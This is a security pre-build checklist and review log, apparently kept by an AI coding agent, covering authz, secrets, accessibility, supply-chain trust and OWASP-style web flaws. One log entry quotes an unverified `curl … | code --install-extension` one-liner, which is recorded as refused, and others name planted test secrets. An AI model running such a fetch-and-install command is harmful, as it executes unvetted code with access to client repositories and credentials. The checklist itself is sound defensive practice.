# System-design & security pre-build checklist

**Standing rule (owner):** before building any new system, run its design against this checklist BEFORE
writing code, and record the pass in the log at the bottom. This is the owner's **@kodekloud** gate.

**Runnable gate (don't self-attest):** the script half of this checklist is automated — run
`node .claude/skills/security-gate/scan.mjs --dir <project> --audit-level high` (the `security-gate`
skill). It FAILS (non-zero) on hardcoded secrets, disabled TLS verification, committed `.env`, and
`npm audit` high/critical. A script can't test authz/multi-tenancy — walk items below + use
`/security-review` for those.

**Source:** distilled from @kodekloud (YouTube `@KodeKloud`, owner-transcribed) — the "if you think your
vibe-coded site is production-ready, here's the list" rundown — plus the Execute hard build rules. The
question every gate must answer: *what makes this production-ready, not just demo-ready?*

> Note: I can't browse the channel's video list here (YouTube is client-side rendered; transcripts aren't
> fetchable). This list is maintained from the owner's transcriptions — add new items here as they transcribe.

> ⚠️ **Agents lie about this — verify, don't trust.** AI coding agents (including me) systematically
> under-report **accessibility, security, and data-subject rights** and will cheerfully say "everything's
> good." Prove each with a *real* tool, not a vibe: a11y → axe / Lighthouse / pa11y; deps → `npm audit` /
> Snyk; secrets → a scanner; authz → an actual cross-tenant test. The two most-skipped, highest-legal-risk
> gates below are **#11 data-subject rights** and **#25 accessibility (ADA/WCAG)** — law firms run automated
> a11y scans and send demand letters; missing data export/delete breaches GDPR/CCPA. Treat both as
> ship-blockers, not nice-to-haves. For the reusable "how to build X correctly" shapes (payments, caching,
> webhooks, gRPC), see `memory/system-design-patterns.md`.

## The gate — scope each item to the system, then mark covered / N-A / deferred-with-reason

### A. Security & access
1. **Input sanitization & injection prevention** — validate/parse/encode at every boundary; server-side.
2. **Authentication** — verify identity on every protected path.
3. **Authorization, roles & permissions** — least privilege; checked at the data layer, not just the UI.
4. **Session management & token expiry** — short-lived tokens, rotation, HttpOnly/Secure/SameSite cookies.
5. **Secrets management** — never in code/repo; env vars + documented `.env.example`/SETUP-KEYS; rotation.
6. **HTTPS/TLS + cert rotation** — encrypt in transit; automate renewal.
7. **Rate limiting & abuse prevention** — per-user/per-IP caps on expensive or abusable endpoints.
8. **Dependency scanning & vulnerability patching** — audit deps; no known-vuln packages shipped.

### B. Data governance & compliance
9. **Multi-tenancy & data isolation** — one tenant can never read another's data (row-level / scoped keys).
10. **PII handling** — minimize collection; encrypt at rest; access-controlled.
11. **Data retention & deletion policy + data-subject rights** — defined lifecycle; **self-serve export and
    delete of a user's own data is a legal must-have** (GDPR/CCPA), not optional. Build the "download my
    data" and "delete my account/data" paths.
12. **Regulatory compliance** — GDPR/CCPA/sector rules as applicable.
13. **Audit trails & tamper-evident logging** — who did what, when; append-only/immutable where it matters.

### C. Testing & CI quality gates
14. **Unit / integration / end-to-end / regression tests** — the suite, kept green.
15. **Load & stress testing** — known behavior under peak; defined limits.
16. **Chaos engineering & resilience testing** — survives dependency/infra failure.
17. **Security & quality checks enforced in CI** — scans/lint/type/tests block merge, not advisory.
18. **Code review process & standards** — no unreviewed path to production.

### D. Reliability & resilience (runtime)
19. **Error handling & graceful degradation** — specific user errors + developer logs; degrade, don't crash.
20. **Retry logic with backoff & idempotency** — safe to retry; no double-effects.
21. **Circuit breakers & fallback behavior** — isolate failing dependencies.
22. **Concurrency handling & race-condition prevention** — correct under parallel access.
23. **Caching strategy & invalidation** — and a real invalidation story.

### E. Operability & documentation
24. **RTO & RPO + disaster recovery plan** — recovery time/point objectives; tested restore.
25. **Accessibility (ADA / WCAG 2.1 AA)** — keyboard nav, focus order, labels/alt, colour contrast, reduced
    motion, semantic landmarks. **Legal exposure** (firms run automated scans → demand letters/fines).
    Verify with axe/Lighthouse/pa11y — don't assume.
26. **ADRs (architecture decision records)** — why the key choices were made.
27. **Architecture diagrams** — the system at a glance.
28. **API contracts** — typed, versioned, documented interfaces.

### F. Supply chain & toolchain trust (protects the build, not just the product)
29. **Dependency / supply-chain integrity** — lockfiles + pinned versions; audit transitive deps
    (`npm audit`/Snyk); be wary of `postinstall` scripts; vet any third-party skill/template/script BEFORE
    auto-loading it (Execute shelves skills that carry executable scripts — see `tool-notes.md`).
30. **Dev-environment / operator trust** — the machine Execute runs on holds client repos, git creds, API
    keys, `.env`s, and live agent sessions. **Never run an unverified `curl|install`, editor extension
    (VSIX), brew/pip/npm-global, or "install this so you get paid" one-liner** — it executes with the
    builder's full privileges. Verify publisher/marketplace/official docs, sandbox if unsure, refuse by
    default, and surface the risk to the owner. ("Logged in / have an account" proves nothing about the
    payload.) See the kickbacks.ai red-flag note in `tool-notes.md`.

*(…and more as transcribed — this list grows.)*

## Web-app vulnerability quick-list (OWASP-flavoured — owner transcripts, 2026-06)
Vibe-coded apps fail these predictably, and agents "say it's fine" without checking. For ANY web app/API:
1. **Broken access control** — every protected route/object checked **server-side** for *this* user (IDOR:
   editing the URL/an id must not expose another user's data). The #1 real-world breach class.
2. **CSRF / request-origin not verified** — state-changing requests must verify origin (CSRF token /
   SameSite cookies / check `Origin`); a forged cross-site request must not look identical to a real one.
3. **XSS** — escape/encode all user content on output; CSP; never `dangerouslySetInnerHTML` untrusted HTML.
4. **Client-only validation** — the browser checks are UX only; **re-validate every input server-side** (the
   API is directly reachable and the UI's "graying out" is just courtesy).
5. **Mass assignment / leaky responses** — the backend must return *only* needed fields (no internal/PII
   columns) and accept *only* whitelisted fields (don't bind the whole request body to the model); the UI
   silently swallowing extra fields hides this.
6. **Broken auth / session** — rotate the **session id on login** (prevent fixation); rate-limit + lockout +
   block common passwords + offer MFA (stop infinite password retries); short-lived tokens.
7. **Path traversal** — never let user input control a stored path/filename (`../` escapes); sanitise + use
   an id→path map.
8. **ReDoS / regex injection** — don't run user input as/through an unbounded regex; bound input + use safe patterns.
9. **Insecure deserialization** — never deserialize untrusted data into objects (poisoned payloads → RCE/
   backdoors); use plain data formats + schema-validate.
10. **Dependency vulnerabilities** — third-party packages are the most likely hole; `npm audit`/Snyk, keep current.
11. **Transport** — HTTPS everywhere; never send anything over plain HTTP.
12. **Payments/PII** — don't roll your own card handling — **use Stripe et al.**; treat PII as a liability
    (minimise, encrypt, access-control, export/delete); never log secrets/PII.

## Pass log
- **2026-06-22 — an example app prioritization-OS data model + engine v1.** Pre-build review: (1) all new fields
  zod-parsed at every boundary; (5) secrets unchanged (env-gated); (7) sync rate-limit intact; (9) no
  cross-tenant surface added; (10/11) deliverable is user-authored goal metadata, behavior-event privacy
  rule untouched, export/delete still honored; (14) 54/54 tests incl. migration/ROI/cap; (19) planner
  degrades to importance fallback when no deliverable. Many items N-A at this layer (local-first, no new
  network surface). PASS.
- **2026-06-22 — Retrofit of shipped an example app against all 28 items.** Full audit in
  `projects/example-app/SECURITY-AUDIT.md`. Hardened now: body-size guard + security headers on all API routes,
  CI gate (typecheck/test/export/`npm audit`), sync key-presence check. Top deferred (ranked, logged):
  #3 server-side Clerk-token authz (sync trusts `x-user-key` — blocks safe multi-user sync; in SETUP-KEYS),
  #7 shared rate-limit store for scale, #8 transitive `@base-org/account→viem→ws` highs. PASS (deferrals tracked).
- **2026-06-22 — FR-OS3 objective mastery (student mode).** Local schema/engine change only: `Card.masteryScore`
  zod-bounded 0–100 (4), no new network surface, no secrets/PII (mastery is a self-entered % on-device).
  Backward-compatible within store v2 (6). 62/62 tests (14). PASS.
- **2026-06-22 — Subjects & Mastery view (You screen).** Pure `subjectMastery()` rollup + profile UI +
  add-subject (reuses `store.addSubject`). UI/engine only, no new network surface, no secrets/PII. 64/64
  tests, web export clean (14/23). PASS.
- **2026-06-22 — Exam-readiness banner + syllabus parser (no-API OS gap closed).** Pure
  `nextExamReadiness()` + `parseSyllabusTopics()` (input bounded: ≤20 topics, ≤60 chars, dedup — item 1),
  local UI/engine only, no new surface. a user-authored tutor skill installed (user-authored, no scripts → safe to
  auto-load; supply-chain item 30 respected). 73/73 tests, web export clean. PASS.
- **2026-06-22 — Store-launch sprint, Phase A.1–A.2.** Native store config (app.json bundle IDs + permission
  strings + plugins, eas.json with TODO(keys) submit profiles, .gitignore hardened for signing secrets).
  **Closed SECURITY-AUDIT #3 (authz, item 3):** sync + account now verify a Clerk session token server-side
  (`@clerk/backend`), identity = verified `sub`, `x-user-key` no longer trusted (#2/#4). Added store-required
  **account deletion** endpoint (#11). 74/74 tests, web export builds. PASS.
- **2026-06-23 — an example marketing site a11y verification + toolchain-trust refusal.** (#25) Real axe-core sweep across
  9 routes × 375/768/1440 found **~47 serious WCAG-AA colour-contrast violations** in a build that had
  "passed" review; fixed all to **0** (footer/ember accent, ghost numerals, muted labels, dimmed step
  states) with taste-preserving nudges. Confirmed `scrollWidth == innerWidth` (no overflow) + 0 console
  errors on every route. (#8) `npm audit`: 2 *moderate* transitive PostCSS advisories via Next 16 — fix is a
  breaking Next downgrade, no runtime exposure on a static export → deferred-with-reason. (#30) Owner relayed
  a `curl -L https://kickbacks.ai/vsix | code --install-extension` one-liner pitched as "part of Execute now,
  so you get paid" — **refused**; nothing in the repo referenced it, an unverified VSIX runs with full
  privileges over repos/creds/sessions. Added items #29/#30 from this. PASS.
- **2026-06-29 — `security-gate` skill built (runnable enforcement).** Turned the script-checkable half
  of this checklist into a build-failing gate (`.claude/skills/security-gate/scan.mjs`): hardcoded
  secrets, disabled TLS verification, committed `.env`, `npm audit` high/critical. Validated it FAILS on
  planted secrets (Stripe `sk_live`, generic `apiKey=…`, `rejectUnauthorized:false`) and ignores
  placeholders / `NEXT_PUBLIC_` / the canonical AWS example key. Ran on an example marketing site: **0 blocking
  findings**, `npm audit` 0 high/critical, 1 review warning (the JSON-LD `dangerouslySetInnerHTML` —
  `JSON.stringify` of owned data, safe). PASS.
- **2026-06-29 — `security-reviewer` agent built (reasoning enforcement, closes the regex gap).** Added
  `.claude/agents/security-reviewer.md`: traces each endpoint source→sink per user for authz/IDOR/
  multi-tenant isolation, mass assignment, injection, business-logic abuse, money/idempotency.
  Validated against a 29-line planted backend (string-built SQL, no ownership checks, whole-body update,
  unvalidated transfer, presence-only auth): the **regex gate PASSED it** (no secrets/TLS/deps), the
  reviewer method flagged **9 issues** (broken auth, 3× IDOR/broken-access-control, SQLi, mass
  assignment, leaky response, negative-amount abuse, replay/race). Proves gate≠sufficient; reviewer
  covers items #1–#6, #9, #19–#22 the scanner can't. security-gate also gained an opportunistic semgrep
  pass. PASS.

**2026-07-07 — an example app PR #2 AI routes (intake/narrate) reasoning review.** (#1) zod everywhere but
intake body size was unguarded — fixed to `readJsonBody`; (#2/3) verified-`sub`-or-anon holds, no
forgery path, empty-sub edge closed; (#7) global-before-per-user ordering confirmed, in-memory
scale limit re-deferred; (#9) no cross-tenant surface; (#19) clean errors/logs; OWASP 3/5/9 pass
(forced tool use + server clamp). SHIP with 3 one-line fixes applied + 1 tracked deferral.
